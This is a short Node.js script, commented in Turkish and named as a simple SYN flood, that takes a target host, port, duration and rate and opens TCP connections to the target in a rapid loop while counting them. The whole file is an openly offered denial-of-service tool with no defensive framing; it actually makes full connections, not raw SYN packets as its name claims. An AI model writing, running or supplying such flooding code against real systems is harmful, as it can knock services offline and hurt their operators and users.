// syn_flood_simple.js - Basit SYN Flood
const net = require('net');

console.log(`[+] SYN Flood: ${params.target}:${params.port}`);

const target = params.target;
const port = params.port;
const endTime = Date.now() + (params.duration * 1000);
const rate = params.rate || 500;

let count = 0;

function sendSYN() {
    if (Date.now() > endTime) {
        console.log(`\n[+] Toplam: ${count} SYN paketi`);
        return;
    }
    
    const socket = new net.Socket();
    socket.unref();
    
    socket.on('error', () => {
        // Hata beklenir - connection refused
    });
    
    socket.on('connect', () => {
        count++;
        socket.end();
    });
    
    socket.connect(port, target);
    
    // Rate kontrolü
    setTimeout(sendSYN, 1000 / rate);
}

sendSYN();
